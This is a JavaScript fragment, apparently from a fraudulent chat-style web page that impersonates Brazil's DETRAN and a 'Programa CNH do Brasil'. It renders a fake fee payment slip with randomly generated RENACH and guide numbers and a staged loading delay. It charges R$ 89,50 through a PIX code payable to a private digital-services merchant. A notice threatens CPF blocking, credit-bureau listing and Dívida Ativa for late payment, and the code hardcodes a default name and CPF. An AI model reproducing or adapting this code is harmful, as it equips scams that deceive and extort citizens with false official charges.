        // Adicionar loading com "Gerando o Guia de Pagamento"
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Gerando o Guia de Pagamento...</div>';
        
        messagesContainer.appendChild(loadingDiv);
        
        // Scroll para o final
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
        
        // Simular geração da guia (3 segundos)
        setTimeout(() => {
            // Remover loading
            loadingDiv.remove();
            
            // Mostrar guia de pagamento
            this.showPaymentGuide(detranName, categoryId);
        }, 3000);
    }

    showPaymentGuide(detranName, categoryId) {
        const messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Gerar dados para a guia
        const renachNumber = this.generateRenachNumber();
        const guideNumber = Math.floor(Math.random() * 100000000);
        const userName = localStorage.getItem('userName') || 'ALBERTINO GOMES DOS REIS DE CARVALHO';
        const userCpf = localStorage.getItem('userCpf') || '233.527.348-52';
        const currentDate = new Date();
        const formattedDate = `${currentDate.getDate().toString().padStart(2, '0')}/${(currentDate.getMonth() + 1).toString().padStart(2, '0')}/${currentDate.getFullYear()} às ${currentDate.getHours().toString().padStart(2, '0')}:${currentDate.getMinutes().toString().padStart(2, '0')}`;
        const dueDate = `${currentDate.getDate().toString().padStart(2, '0')}/${(currentDate.getMonth() + 1).toString().padStart(2, '0')}/${currentDate.getFullYear()}`;
        
        // Criar guia de pagamento
        const guideContainer = document.createElement('div');
        guideContainer.className = 'w-full mt-4 mb-4';
        guideContainer.style.cssText = 'width: 100%; margin-top: 1rem; margin-bottom: 1rem;';
        
        const guideCard = document.createElement('div');
        guideCard.className = 'bg-white border-2 border-gray-300 shadow-lg';
        guideCard.style.cssText = 'background-color: white; border: 2px solid rgb(209, 213, 219); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); font-family: Arial, sans-serif;';
        
        // Header da guia
        const guideHeader = document.createElement('div');
        guideHeader.className = 'bg-white p-4 border-b border-gray-300';
        guideHeader.style.cssText = 'background-color: white; padding: 1rem; border-bottom: 1px solid rgb(209, 213, 219);';
        
        const headerContent = document.createElement('div');
        headerContent.className = 'flex flex-col items-center';
        headerContent.style.cssText = 'display: flex; flex-direction: column; align-items: center;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'img/cnh-brasil-logo.png';
        logoImg.alt = 'CNH Brasil';
        logoImg.className = 'h-16 max-w-[200px] object-contain mb-2';
        logoImg.style.cssText = 'height: 4rem; max-width: 200px; object-fit: contain; margin-bottom: 0.5rem;';
        
        const titleP = document.createElement('p');
        titleP.className = 'text-sm font-bold text-gray-800';
        titleP.style.cssText = 'font-size: 0.875rem; font-weight: 700; color: rgb(31, 41, 55);';
        titleP.textContent = 'GUIA DE RECOLHIMENTO';
        
        const subtitleP = document.createElement('p');
        subtitleP.className = 'text-xs text-gray-600';
        subtitleP.style.cssText = 'font-size: 0.75rem; color: rgb(75, 85, 99);';
        subtitleP.textContent = 'TAXAS ADMINISTRATIVAS CNH';
        
        headerContent.appendChild(logoImg);
        headerContent.appendChild(titleP);
        headerContent.appendChild(subtitleP);
        guideHeader.appendChild(headerContent);
        guideCard.appendChild(guideHeader);
        
        // Contribuinte
        const contributorSection = document.createElement('div');
        contributorSection.className = 'p-4 border-b border-gray-300';
        contributorSection.style.cssText = 'padding: 1rem; border-bottom: 1px solid rgb(209, 213, 219);';
        
        const contributorDiv = document.createElement('div');
        const contributorLabel = document.createElement('p');
        contributorLabel.className = 'text-gray-500 text-xs';
        contributorLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        contributorLabel.textContent = 'CONTRIBUINTE';
        contributorDiv.appendChild(contributorLabel);
        
        const contributorName = document.createElement('p');
        contributorName.className = 'font-bold text-gray-800';
        contributorName.style.cssText = 'font-weight: 700; color: rgb(31, 41, 55);';
        contributorName.textContent = userName.toUpperCase();
        contributorDiv.appendChild(contributorName);
        
        const cpfDiv = document.createElement('div');
        cpfDiv.className = 'mt-2';
        cpfDiv.style.cssText = 'margin-top: 0.5rem;';
        
        const cpfLabel = document.createElement('p');
        cpfLabel.className = 'text-gray-500 text-xs';
        cpfLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        cpfLabel.textContent = 'CPF';
        cpfDiv.appendChild(cpfLabel);
        
        const cpfValue = document.createElement('p');
        cpfValue.className = 'font-semibold text-gray-800';
        cpfValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55);';
        cpfValue.textContent = userCpf;
        cpfDiv.appendChild(cpfValue);
        
        contributorSection.appendChild(contributorDiv);
        contributorSection.appendChild(cpfDiv);
        guideCard.appendChild(contributorSection);
        
        // Exercício
        const exerciseSection = document.createElement('div');
        exerciseSection.className = 'p-4 border-b border-gray-300 bg-gray-50';
        exerciseSection.style.cssText = 'padding: 1rem; border-bottom: 1px solid rgb(209, 213, 219); background-color: rgb(249, 250, 251);';
        
        const exerciseContent = document.createElement('div');
        exerciseContent.className = 'text-center';
        exerciseContent.style.cssText = 'text-align: center;';
        
        const exerciseLabel = document.createElement('p');
        exerciseLabel.className = 'text-gray-500 text-xs';
        exerciseLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        exerciseLabel.textContent = 'EXERCÍCIO';
        exerciseContent.appendChild(exerciseLabel);
        
        const exerciseValue = document.createElement('p');
        exerciseValue.className = 'font-bold text-gray-800 text-lg';
        exerciseValue.style.cssText = 'font-weight: 700; color: rgb(31, 41, 55); font-size: 1.125rem;';
        exerciseValue.textContent = currentDate.getFullYear();
        exerciseContent.appendChild(exerciseValue);
        
        exerciseSection.appendChild(exerciseContent);
        guideCard.appendChild(exerciseSection);
        
        // RENACH, Nº Guia, Vencimento
        const infoSection = document.createElement('div');
        infoSection.className = 'p-4 border-b border-gray-300';
        infoSection.style.cssText = 'padding: 1rem; border-bottom: 1px solid rgb(209, 213, 219);';
        
        const infoGrid = document.createElement('div');
        infoGrid.className = 'grid grid-cols-3 gap-2 text-sm';
        infoGrid.style.cssText = 'display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.5rem; font-size: 0.875rem;';
        
        // RENACH
        const renachDiv = document.createElement('div');
        const renachLabel = document.createElement('p');
        renachLabel.className = 'text-gray-500 text-xs';
        renachLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        renachLabel.textContent = 'Nº RENACH';
        renachDiv.appendChild(renachLabel);
        
        const renachValue = document.createElement('p');
        renachValue.className = 'font-semibold text-gray-800';
        renachValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55);';
        renachValue.textContent = renachNumber;
        renachDiv.appendChild(renachValue);
        
        // Nº Guia
        const guideNumDiv = document.createElement('div');
        const guideNumLabel = document.createElement('p');
        guideNumLabel.className = 'text-gray-500 text-xs';
        guideNumLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        guideNumLabel.textContent = 'Nº GUIA';
        guideNumDiv.appendChild(guideNumLabel);
        
        const guideNumValue = document.createElement('p');
        guideNumValue.className = 'font-semibold text-gray-800';
        guideNumValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55);';
        guideNumValue.textContent = guideNumber;
        guideNumDiv.appendChild(guideNumValue);
        
        // Vencimento
        const dueDateDiv = document.createElement('div');
        const dueDateLabel = document.createElement('p');
        dueDateLabel.className = 'text-gray-500 text-xs';
        dueDateLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        dueDateLabel.textContent = 'VENCIMENTO';
        dueDateDiv.appendChild(dueDateLabel);
        
        const dueDateValue = document.createElement('p');
        dueDateValue.className = 'font-semibold text-gray-800';
        dueDateValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55);';
        dueDateValue.textContent = dueDate;
        dueDateDiv.appendChild(dueDateValue);
        
        infoGrid.appendChild(renachDiv);
        infoGrid.appendChild(guideNumDiv);
        infoGrid.appendChild(dueDateDiv);
        infoSection.appendChild(infoGrid);
        guideCard.appendChild(infoSection);
        
        // Discriminação dos débitos
        const debtsSection = document.createElement('div');
        debtsSection.className = 'p-4 border-b border-gray-300';
        debtsSection.style.cssText = 'padding: 1rem; border-bottom: 1px solid rgb(209, 213, 219);';
        
        const debtsHeader = document.createElement('div');
        debtsHeader.className = 'bg-[#1351B4] text-white p-2 mb-2';
        debtsHeader.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.5rem; margin-bottom: 0.5rem;';
        
        const debtsHeaderContent = document.createElement('div');
        debtsHeaderContent.className = 'flex justify-between text-xs font-bold';
        debtsHeaderContent.style.cssText = 'display: flex; justify-content: space-between; font-size: 0.75rem; font-weight: 700;';
        
        const debtsLabel = document.createElement('span');
        debtsLabel.textContent = 'DISCRIMINAÇÃO DOS DÉBITOS';
        
        const debtsValueLabel = document.createElement('span');
        debtsValueLabel.textContent = 'VALORES EM REAIS';
        
        debtsHeaderContent.appendChild(debtsLabel);
        debtsHeaderContent.appendChild(debtsValueLabel);
        debtsHeader.appendChild(debtsHeaderContent);
        debtsSection.appendChild(debtsHeader);
        
        const debtsList = document.createElement('div');
        debtsList.className = 'space-y-1 text-sm';
        debtsList.style.cssText = 'display: flex; flex-direction: column; gap: 0.25rem; font-size: 0.875rem;';
        
        // TED
        const tedDiv = document.createElement('div');
        tedDiv.className = 'flex justify-between py-1 border-b border-gray-200';
        tedDiv.style.cssText = 'display: flex; justify-content: space-between; padding-top: 0.25rem; padding-bottom: 0.25rem; border-bottom: 1px solid rgb(229, 231, 235);';
        
        const tedLabel = document.createElement('span');
        tedLabel.className = 'text-gray-700';
        tedLabel.style.cssText = 'color: rgb(55, 65, 81);';
        tedLabel.textContent = 'TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)';
        
        const tedValue = document.createElement('span');
        tedValue.className = 'font-semibold';
        tedValue.style.cssText = 'font-weight: 600;';
        tedValue.textContent = '36,10';
        
        tedDiv.appendChild(tedLabel);
        tedDiv.appendChild(tedValue);
        debtsList.appendChild(tedDiv);
        
        // TSA
        const tsaDiv = document.createElement('div');
        tsaDiv.className = 'flex justify-between py-1 border-b border-gray-200';
        tsaDiv.style.cssText = 'display: flex; justify-content: space-between; padding-top: 0.25rem; padding-bottom: 0.25rem; border-bottom: 1px solid rgb(229, 231, 235);';
        
        const tsaLabel = document.createElement('span');
        tsaLabel.className = 'text-gray-700';
        tsaLabel.style.cssText = 'color: rgb(55, 65, 81);';
        tsaLabel.textContent = 'TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)';
        
        const tsaValue = document.createElement('span');
        tsaValue.className = 'font-semibold';
        tsaValue.style.cssText = 'font-weight: 600;';
        tsaValue.textContent = '26,70';
        
        tsaDiv.appendChild(tsaLabel);
        tsaDiv.appendChild(tsaValue);
        debtsList.appendChild(tsaDiv);
        
        // TPE
        const tpeDiv = document.createElement('div');
        tpeDiv.className = 'flex justify-between py-1 border-b border-gray-200';
        tpeDiv.style.cssText = 'display: flex; justify-content: space-between; padding-top: 0.25rem; padding-bottom: 0.25rem; border-bottom: 1px solid rgb(229, 231, 235);';
        
        const tpeLabel = document.createElement('span');
        tpeLabel.className = 'text-gray-700';
        tpeLabel.style.cssText = 'color: rgb(55, 65, 81);';
        tpeLabel.textContent = 'TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)';
        
        const tpeValue = document.createElement('span');
        tpeValue.className = 'font-semibold';
        tpeValue.style.cssText = 'font-weight: 600;';
        tpeValue.textContent = '26,70';
        
        tpeDiv.appendChild(tpeLabel);
        tpeDiv.appendChild(tpeValue);
        debtsList.appendChild(tpeDiv);
        
        // Total
        const totalDiv = document.createElement('div');
        totalDiv.className = 'flex justify-between py-2 bg-gray-100 px-2 font-bold';
        totalDiv.style.cssText = 'display: flex; justify-content: space-between; padding-top: 0.5rem; padding-bottom: 0.5rem; background-color: rgb(243, 244, 246); padding-left: 0.5rem; padding-right: 0.5rem; font-weight: 700;';
        
        const totalLabel = document.createElement('span');
        totalLabel.textContent = 'TOTAL';
        
        const totalValue = document.createElement('span');
        totalValue.textContent = '89,50';
        
        totalDiv.appendChild(totalLabel);
        totalDiv.appendChild(totalValue);
        debtsList.appendChild(totalDiv);
        
        debtsSection.appendChild(debtsList);
        guideCard.appendChild(debtsSection);
        
        // Observações
        const observationsSection = document.createElement('div');
        observationsSection.className = 'p-4 border-b border-gray-300 bg-red-50';
        observationsSection.style.cssText = 'padding: 1rem; border-bottom: 1px solid rgb(209, 213, 219); background-color: rgb(254, 242, 242);';
        
        const obsTitle = document.createElement('p');
        obsTitle.className = 'text-sm text-red-600 font-bold mb-2';
        obsTitle.style.cssText = 'font-size: 0.875rem; color: rgb(220, 38, 38); font-weight: 700; margin-bottom: 0.5rem;';
        obsTitle.textContent = 'Observações:';
        
        const obsText = document.createElement('p');
        obsText.className = 'text-sm text-red-600 mb-1';
        obsText.style.cssText = 'font-size: 0.875rem; color: rgb(220, 38, 38); margin-bottom: 0.25rem;';
        obsText.innerHTML = `Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o <span class="font-bold">CPF</span> do responsável (<span class="font-bold">${userCpf}</span>) será bloqueado no programa pelo período de <span class="font-bold">18 (dezoito) meses</span>. Além disso, o valor da taxa, acrescido de multas, será registrado no <span class="font-bold">CPF</span> junto aos órgãos de proteção ao crédito (<span class="font-bold">SPC</span> e <span class="font-bold">SERASA</span>), bem como inscrito em <span class="font-bold">Dívida Ativa da União</span>, nos termos do art. 2º da <span class="font-bold">Lei nº 6.830/1980</span> (Lei de Execuções Fiscais) e do art. 43 da <span class="font-bold">Lei nº 8.078/1990</span>`;
        
        observationsSection.appendChild(obsTitle);
        observationsSection.appendChild(obsText);
        guideCard.appendChild(observationsSection);
        
        // Data de emissão
        const emissionSection = document.createElement('div');
        emissionSection.className = 'p-4 text-xs text-gray-500 border-b border-gray-300';
        emissionSection.style.cssText = 'padding: 1rem; font-size: 0.75rem; color: rgb(107, 114, 128); border-bottom: 1px solid rgb(209, 213, 219);';
        
        const emissionText = document.createElement('p');
        emissionText.textContent = `EMITIDO EM ${formattedDate.toUpperCase()}`;
        
        emissionSection.appendChild(emissionText);
        guideCard.appendChild(emissionSection);
        
        // PIX
        const pixSection = document.createElement('div');
        pixSection.className = 'bg-gray-100 p-4 border-t-2 border-dashed border-gray-400';
        pixSection.style.cssText = 'background-color: rgb(243, 244, 246); padding: 1rem; border-top: 2px dashed rgb(156, 163, 175);';
        
        const pixHeader = document.createElement('div');
        pixHeader.className = 'text-center mb-3';
        pixHeader.style.cssText = 'text-align: center; margin-bottom: 0.75rem;';
        
        const pixTitle = document.createElement('p');
        pixTitle.className = 'font-bold text-sm text-[#1351B4]';
        pixTitle.style.cssText = 'font-weight: 700; font-size: 0.875rem; color: rgb(19, 81, 180);';
        pixTitle.textContent = 'DETRAN/DF - PAGAMENTO VIA PIX';
        
        const pixSubtitle = document.createElement('p');
        pixSubtitle.className = 'text-xs text-gray-600';
        pixSubtitle.style.cssText = 'font-size: 0.75rem; color: rgb(75, 85, 99);';
        pixSubtitle.textContent = 'Programa CNH do Brasil - Taxas Administrativas';
        
        pixHeader.appendChild(pixTitle);
        pixHeader.appendChild(pixSubtitle);
        pixSection.appendChild(pixHeader);
        
        const pixCodeContainer = document.createElement('div');
        pixCodeContainer.className = 'bg-white p-3 rounded border border-gray-300 mb-3';
        pixCodeContainer.style.cssText = 'background-color: white; padding: 0.75rem; border-radius: 0.375rem; border: 1px solid rgb(209, 213, 219); margin-bottom: 0.75rem;';
        
        const pixCodeLabel = document.createElement('p');
        pixCodeLabel.className = 'text-xs text-gray-500 mb-1';
        pixCodeLabel.style.cssText = 'font-size: 0.75rem; color: rgb(107, 114, 128); margin-bottom: 0.25rem;';
        pixCodeLabel.textContent = 'CÓDIGO PIX COPIA E COLA:';
        
        const pixCode = document.createElement('p');
        pixCode.className = 'text-xs break-all font-mono bg-gray-50 p-2 rounded border';
        pixCode.style.cssText = 'font-size: 0.75rem; word-break: break-all; font-family: monospace; background-color: rgb(249, 250, 251); padding: 0.5rem; border-radius: 0.375rem; border: 1px solid rgb(209, 213, 219);';
        pixCode.textContent = '00020101021226940014br.gov.bcb.pix2572qrcode.somossimpay.com.br/v2/qr/cob/fe149f89-5b4d-4146-ae87-a807330f6a1e5204000053039865802BR5925MARKTPLACE SERVICOS DIGIT6009SAO PAULO62070503***63046843';
        
        pixCodeContainer.appendChild(pixCodeLabel);
        pixCodeContainer.appendChild(pixCode);
        pixSection.appendChild(pixCodeContainer);
        
        const copyBtn = document.createElement('button');
        copyBtn.className = 'w-full flex items-center justify-center gap-2 p-4 bg-[#1351B4] text-white rounded-md shadow-md hover:bg-[#0D3A8C] transition-all font-medium';
        copyBtn.style.cssText = 'width: 100%; display: flex; align-items: center; justify-content: center; gap: 0.5rem; padding: 1rem; background-color: rgb(19, 81, 180); color: white; border-radius: 0.375rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; font-weight: 500; cursor: pointer; border: none;';
        
        const copyIcon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        copyIcon.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
        copyIcon.setAttribute('width', '24');
        copyIcon.setAttribute('height', '24');
        copyIcon.setAttribute('viewBox', '0 0 24 24');
        copyIcon.setAttribute('fill', 'none');
        copyIcon.setAttribute('stroke', 'currentColor');
        copyIcon.setAttribute('stroke-width', '2');
        copyIcon.setAttribute('stroke-linecap', 'round');
        copyIcon.setAttribute('stroke-linejoin', 'round');
        copyIcon.setAttribute('class', 'lucide lucide-copy w-5 h-5');
        copyIcon.style.cssText = 'width: 1.25rem; height: 1.25rem;';
        
        const copyRect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
        copyRect.setAttribute('width', '14');
        copyRect.setAttribute('height', '14');
        copyRect.setAttribute('x', '8');
        copyRect.setAttribute('y', '8');
        copyRect.setAttribute('rx', '2');
        copyRect.setAttribute('ry', '2');
        
        const copyPath = document.createElementNS('http://www.w3.org/2000/svg', 'path');
        copyPath.setAttribute('d', 'M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2');
        
        copyIcon.appendChild(copyRect);
        copyIcon.appendChild(copyPath);
        
        const copyText = document.createElement('span');
        copyText.textContent = 'Copiar Código PIX';
        
        copyBtn.appendChild(copyIcon);
        copyBtn.appendChild(copyText);
        
        copyBtn.addEventListener('click', () => {
            // Copiar código PIX para clipboard
            navigator.clipboard.writeText(pixCode.textContent).then(() => {
                copyText.textContent = 'Copiado!';
                setTimeout(() => {
                    copyText.textContent = 'Copiar Código PIX';
                }, 2000);
            });
        });
        
        pixSection.appendChild(copyBtn);
        
        const pixFooter = document.createElement('div');
        pixFooter.className = 'mt-3 flex justify-between text-sm';
        pixFooter.style.cssText = 'margin-top: 0.75rem; display: flex; justify-content: space-between; font-size: 0.875rem;';
        
        const pixDueDateDiv = document.createElement('div');
        const pixDueDateLabel = document.createElement('p');
        pixDueDateLabel.className = 'text-gray-500 text-xs';
        pixDueDateLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        pixDueDateLabel.textContent = 'VENCIMENTO DA GUIA';
        
        const pixDueDateValue = document.createElement('p');
        pixDueDateValue.className = 'font-bold';
        pixDueDateValue.style.cssText = 'font-weight: 700;';
        pixDueDateValue.textContent = dueDate;
        
        pixDueDateDiv.appendChild(pixDueDateLabel);
        pixDueDateDiv.appendChild(pixDueDateValue);
        
        const pixValueDiv = document.createElement('div');
        pixValueDiv.className = 'text-right';
        
        const pixValueLabel = document.createElement('p');
        pixValueLabel.className = 'text-gray-500 text-xs';
        pixValueLabel.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
        pixValueLabel.textContent = 'VALOR A PAGAR EM REAIS';
        
        const pixValueValue = document.createElement('p');
        pixValueValue.className = 'font-bold text-lg';
        pixValueValue.style.cssText = 'font-weight: 700; font-size: 1.125rem;';
        pixValueValue.textContent = 'R$ 89,50';
        
        pixValueDiv.appendChild(pixValueLabel);
        pixValueDiv.appendChild(pixValueValue);
        
        pixFooter.appendChild(pixDueDateDiv);
        pixFooter.appendChild(pixValueDiv);
        pixSection.appendChild(pixFooter);
        
        const pixStatus = document.createElement('div');
        pixStatus.className = 'mt-4 pt-4 border-t-2 border-dashed border-gray-400';
        pixStatus.style.cssText = 'margin-top: 1rem; padding-top: 1rem; border-top: 2px dashed rgb(156, 163, 175);';
        
        const statusBox = document.createElement('div');
        statusBox.className = 'bg-yellow-50 border border-yellow-300 rounded-lg p-3 text-center';
        statusBox.style.cssText = 'background-color: rgb(254, 252, 232); border: 1px solid rgb(252, 211, 77); border-radius: 0.5rem; padding: 0.75rem; text-align: center;';
        
        const statusHeader = document.createElement('div');
        statusHeader.className = 'flex items-center justify-center gap-2 mb-1';
        statusHeader.style.cssText = 'display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 0.25rem;';
        
        const dotsContainer = document.createElement('div');
        dotsContainer.className = 'flex items-center gap-1';
        dotsContainer.style.cssText = 'display: flex; align-items: center; gap: 0.25rem;';
        
        for (let i = 0; i < 3; i++) {
            const dot = document.createElement('span');
            dot.className = 'w-2 h-2 bg-yellow-500 rounded-full animate-pulse';
            dot.style.cssText = 'width: 0.5rem; height: 0.5rem; background-color: rgb(234, 179, 8); border-radius: 50%; animation: pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite;';
            dot.style.animationDelay = `${i * 0.15}s`;
            dotsContainer.appendChild(dot);
        }
        
        const statusText = document.createElement('span');
        statusText.className = 'text-yellow-800 font-semibold text-sm';
        statusText.style.cssText = 'color: rgb(133, 77, 14); font-weight: 600; font-size: 0.875rem;';
        statusText.textContent = 'AGUARDANDO PAGAMENTO';
        
        statusHeader.appendChild(dotsContainer);
        statusHeader.appendChild(statusText);
        
        const statusFooter = document.createElement('p');
        statusFooter.className = 'text-yellow-700 text-xs';
        statusFooter.style.cssText = 'color: rgb(161, 98, 7); font-size: 0.75rem;';
        statusFooter.textContent = 'Esta guia vence em: 07:47';
        
        statusBox.appendChild(statusHeader);
        statusBox.appendChild(statusFooter);
        pixStatus.appendChild(statusBox);
        pixSection.appendChild(pixStatus);
        
        guideCard.appendChild(pixSection);
        guideContainer.appendChild(guideCard);
        messagesContainer.appendChild(guideContainer);
        
        // Scroll para o final
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
        
        // Mostrar instruções de pagamento
        setTimeout(() => {
            this.showPaymentInstructions();
        }, 500);
    }

    showPaymentInstructions() {
        const messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Mostrar loading
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Processando...</div>';
        
        messagesContainer.appendChild(loadingDiv);
        
        // Scroll para o final
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
        
        // Simular processamento
        setTimeout(() => {
            // Transformar loading em mensagem do sistema sobre instruções
            loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
            loadingDiv.innerHTML = `Para realizar o pagamento via PIX Copia e Cola:

1. Copie o código PIX clicando no botão "Copiar Código PIX"
2. Abra o aplicativo do seu banco
3. Acesse a área PIX e selecione "Pagar com PIX Copia e Cola"
4. Cole o código copiado e confirme o pagamento

Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.

Assim que realizar o pagamento das taxas no valor de R$ 89,50, clique no botão abaixo para ativar seu cadastro.`;
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }, 1000);
    }

    handleDocumentConfirmation(optionId, detranName, categoryId) {
        // Este método não será mais usado no novo fluxo
        // Mantido para compatibilidade
    }

    generateRenachNumber() {
        // Gerar número RENACH com 11 dígitos (formato real)
        const digits = [];
        for (let i = 0; i < 11; i++) {
            digits.push(Math.floor(Math.random() * 10));
        }
        return digits.join('');
    }

    generateProtocolNumber() {
        // Gerar número de protocolo no formato YYYYXXXXXXXXX
        const year = new Date().getFullYear();
        const random = Math.floor(Math.random() * 10000000000); // 10 dígitos
        return `${year}${random.toString().padStart(10, '0')}`;
    }
}
